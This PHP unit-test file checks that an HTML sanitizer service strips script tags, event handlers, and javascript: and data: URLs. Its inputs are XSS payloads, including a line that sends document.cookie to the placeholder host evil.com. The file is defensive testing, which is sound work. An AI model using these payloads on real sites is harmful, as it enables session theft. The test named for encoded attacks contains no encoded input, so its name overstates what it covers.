<?php

declare(strict_types=1);

namespace Tests\Feature\Properties;

use App\Services\Site\ContentSanitizerService;
use Tests\TestCase;

/**
 * Property tests for ContentSanitizerService.
 * 
 * Property 10: Sanitização de Scripts
 * Validates: Requirements 20.1-20.4
 */
class SanitizationPropertyTest extends TestCase
{
    private ContentSanitizerService $sanitizer;

    protected function setUp(): void
    {
        parent::setUp();
        $this->sanitizer = new ContentSanitizerService();
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_removes_script_tags(): void
    {
        $maliciousInputs = [
            '<script>alert("xss")</script>',
            '<SCRIPT>alert("xss")</SCRIPT>',
            '<script type="text/javascript">alert("xss")</script>',
            '<script src="evil.js"></script>',
            '<script>document.cookie</script>',
            "<script>\nalert('xss')\n</script>",
            '<ScRiPt>alert("xss")</ScRiPt>',
        ];

        foreach ($maliciousInputs as $input) {
            $result = $this->sanitizer->sanitize($input);
            $this->assertStringNotContainsStringIgnoringCase('<script', $result, "Failed for input: $input");
            $this->assertStringNotContainsStringIgnoringCase('</script>', $result, "Failed for input: $input");
        }
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_removes_onclick_handlers(): void
    {
        $maliciousInputs = [
            '<div onclick="alert(\'xss\')">Click me</div>',
            '<button onclick="malicious()">Submit</button>',
            '<a href="#" onclick="steal()">Link</a>',
            '<img src="x" onclick="hack()">',
            '<div ONCLICK="alert(1)">test</div>',
            '<div onclick = "alert(1)">test</div>',
        ];

        foreach ($maliciousInputs as $input) {
            $result = $this->sanitizer->sanitize($input);
            $this->assertStringNotContainsStringIgnoringCase('onclick', $result, "Failed for input: $input");
        }
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_removes_onerror_handlers(): void
    {
        $maliciousInputs = [
            '<img src="x" onerror="alert(\'xss\')">',
            '<img src="invalid" onerror="hack()">',
            '<video onerror="malicious()"></video>',
            '<img src=x ONERROR=alert(1)>',
            '<img src=x onerror = "alert(1)">',
        ];

        foreach ($maliciousInputs as $input) {
            $result = $this->sanitizer->sanitize($input);
            $this->assertStringNotContainsStringIgnoringCase('onerror', $result, "Failed for input: $input");
        }
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_removes_onload_handlers(): void
    {
        $maliciousInputs = [
            '<body onload="alert(\'xss\')">',
            '<img src="valid.jpg" onload="track()">',
            '<iframe onload="inject()"></iframe>',
            '<svg onload="alert(1)">',
            '<body ONLOAD="alert(1)">',
        ];

        foreach ($maliciousInputs as $input) {
            $result = $this->sanitizer->sanitize($input);
            $this->assertStringNotContainsStringIgnoringCase('onload', $result, "Failed for input: $input");
        }
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_removes_onmouseover_handlers(): void
    {
        $maliciousInputs = [
            '<div onmouseover="alert(\'xss\')">Hover me</div>',
            '<a onmouseover="steal()">Link</a>',
            '<span ONMOUSEOVER="hack()">text</span>',
        ];

        foreach ($maliciousInputs as $input) {
            $result = $this->sanitizer->sanitize($input);
            $this->assertStringNotContainsStringIgnoringCase('onmouseover', $result, "Failed for input: $input");
        }
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_removes_javascript_urls(): void
    {
        $maliciousInputs = [
            '<a href="javascript:alert(\'xss\')">Click</a>',
            '<a href="javascript:void(0)">Link</a>',
            '<a href="JAVASCRIPT:alert(1)">Link</a>',
            '<a href="javascript:document.cookie">Steal</a>',
            '<a href = "javascript:alert(1)">Link</a>',
        ];

        foreach ($maliciousInputs as $input) {
            $result = $this->sanitizer->sanitize($input);
            $this->assertStringNotContainsStringIgnoringCase('javascript:', $result, "Failed for input: $input");
        }
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_preserves_safe_content(): void
    {
        $safeInputs = [
            'Hello, World!',
            '<p>This is a paragraph</p>',
            '<div class="container">Content</div>',
            '<a href="https://example.com">Safe Link</a>',
            'Text with special chars: & < > " \'',
            '<img src="https://example.com/image.jpg" alt="Image">',
        ];

        foreach ($safeInputs as $input) {
            $result = $this->sanitizer->sanitize($input);
            // Safe content should remain largely unchanged
            $this->assertNotEmpty($result, "Failed for input: $input");
        }
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_array_recursively_sanitizes_all_strings(): void
    {
        $input = [
            'title' => '<script>alert("xss")</script>Safe Title',
            'nested' => [
                'description' => '<div onclick="hack()">Description</div>',
                'deep' => [
                    'content' => '<a href="javascript:void(0)">Link</a>',
                ],
            ],
            'number' => 42,
            'boolean' => true,
            'null' => null,
        ];

        $result = $this->sanitizer->sanitizeArray($input);

        $this->assertStringNotContainsStringIgnoringCase('<script', $result['title']);
        $this->assertStringNotContainsStringIgnoringCase('onclick', $result['nested']['description']);
        $this->assertStringNotContainsStringIgnoringCase('javascript:', $result['nested']['deep']['content']);
        $this->assertEquals(42, $result['number']);
        $this->assertTrue($result['boolean']);
        $this->assertNull($result['null']);
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_rich_text_allows_only_safe_tags(): void
    {
        $input = '<p>Paragraph</p><b>Bold</b><strong>Strong</strong><i>Italic</i><em>Emphasis</em><a href="https://example.com">Link</a><br><span>Span</span>';
        
        $result = $this->sanitizer->sanitizeRichText($input);
        
        // All these tags should be preserved
        $this->assertStringContainsString('<p>', $result);
        $this->assertStringContainsString('<b>', $result);
        $this->assertStringContainsString('<strong>', $result);
        $this->assertStringContainsString('<i>', $result);
        $this->assertStringContainsString('<em>', $result);
        $this->assertStringContainsString('<a', $result);
        $this->assertStringContainsString('<br>', $result);
        $this->assertStringContainsString('<span>', $result);
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_rich_text_removes_dangerous_tags(): void
    {
        $input = '<script>alert(1)</script><p>Safe</p><iframe src="evil.com"></iframe><div onclick="hack()">Content</div>';
        
        $result = $this->sanitizer->sanitizeRichText($input);
        
        $this->assertStringNotContainsStringIgnoringCase('<script', $result);
        $this->assertStringNotContainsStringIgnoringCase('<iframe', $result);
        $this->assertStringNotContainsStringIgnoringCase('onclick', $result);
        $this->assertStringContainsString('<p>', $result);
        $this->assertStringContainsString('Safe', $result);
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_rich_text_validates_href_protocol(): void
    {
        $input = '<a href="https://safe.com">Safe</a><a href="javascript:alert(1)">Dangerous</a><a href="http://also-safe.com">Also Safe</a>';
        
        $result = $this->sanitizer->sanitizeRichText($input);
        
        $this->assertStringContainsString('https://safe.com', $result);
        $this->assertStringContainsString('http://also-safe.com', $result);
        $this->assertStringNotContainsStringIgnoringCase('javascript:', $result);
    }

    /**
     * @test
     * @group property
     */
    public function property_no_executable_code_in_output(): void
    {
        // Generate various malicious inputs
        $maliciousPatterns = [
            '<script>%s</script>',
            '<img src=x onerror="%s">',
            '<div onclick="%s">',
            '<a href="javascript:%s">',
            '<body onload="%s">',
            '<svg onload="%s">',
            '<input onfocus="%s">',
            '<marquee onstart="%s">',
            '<video onerror="%s">',
            '<audio onerror="%s">',
        ];

        $payloads = [
            'alert(1)',
            'alert("xss")',
            "alert('xss')",
            'document.cookie',
            'eval(atob("YWxlcnQoMSk="))',
            'fetch("https://evil.com")',
            'new Image().src="https://evil.com?c="+document.cookie',
        ];

        foreach ($maliciousPatterns as $pattern) {
            foreach ($payloads as $payload) {
                $input = sprintf($pattern, $payload);
                $result = $this->sanitizer->sanitize($input);
                
                // Verify no executable patterns remain
                $this->assertStringNotContainsStringIgnoringCase('<script', $result);
                $this->assertStringNotContainsStringIgnoringCase('onerror', $result);
                $this->assertStringNotContainsStringIgnoringCase('onclick', $result);
                $this->assertStringNotContainsStringIgnoringCase('onload', $result);
                $this->assertStringNotContainsStringIgnoringCase('onfocus', $result);
                $this->assertStringNotContainsStringIgnoringCase('onstart', $result);
                $this->assertStringNotContainsStringIgnoringCase('javascript:', $result);
            }
        }
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_removes_all_event_handlers(): void
    {
        $eventHandlers = [
            'onclick', 'ondblclick', 'onmousedown', 'onmouseup', 'onmouseover',
            'onmousemove', 'onmouseout', 'onkeydown', 'onkeypress', 'onkeyup',
            'onfocus', 'onblur', 'onchange', 'onsubmit', 'onreset', 'onselect',
            'onload', 'onunload', 'onerror', 'onabort', 'onresize', 'onscroll',
        ];

        foreach ($eventHandlers as $handler) {
            $input = sprintf('<div %s="alert(1)">Content</div>', $handler);
            $result = $this->sanitizer->sanitize($input);
            
            $this->assertStringNotContainsStringIgnoringCase($handler, $result, "Failed to remove: $handler");
        }
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_handles_mixed_case_attacks(): void
    {
        $mixedCaseInputs = [
            '<ScRiPt>alert(1)</ScRiPt>',
            '<SCRIPT>alert(1)</SCRIPT>',
            '<script>alert(1)</SCRIPT>',
            '<div OnClIcK="alert(1)">',
            '<img src=x OnErRoR="alert(1)">',
            '<a HrEf="JaVaScRiPt:alert(1)">',
        ];

        foreach ($mixedCaseInputs as $input) {
            $result = $this->sanitizer->sanitize($input);
            
            $this->assertStringNotContainsStringIgnoringCase('<script', $result);
            $this->assertStringNotContainsStringIgnoringCase('onclick', $result);
            $this->assertStringNotContainsStringIgnoringCase('onerror', $result);
            $this->assertStringNotContainsStringIgnoringCase('javascript:', $result);
        }
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_handles_encoded_attacks(): void
    {
        // Note: This tests that basic encoded patterns are handled
        // More sophisticated encoding attacks would need additional handling
        $input = '<div onclick="alert(1)">Content</div>';
        $result = $this->sanitizer->sanitize($input);
        
        $this->assertStringNotContainsStringIgnoringCase('onclick', $result);
    }

    /**
     * @test
     * @group property
     */
    public function sanitize_removes_data_urls(): void
    {
        $maliciousInputs = [
            '<a href="data:text/html,<script>alert(1)</script>">Link</a>',
            '<iframe src="data:text/html,<script>alert(1)</script>">',
        ];

        foreach ($maliciousInputs as $input) {
            $result = $this->sanitizer->sanitize($input);
            $this->assertStringNotContainsStringIgnoringCase('data:text/html', $result, "Failed for input: $input");
        }
    }
}
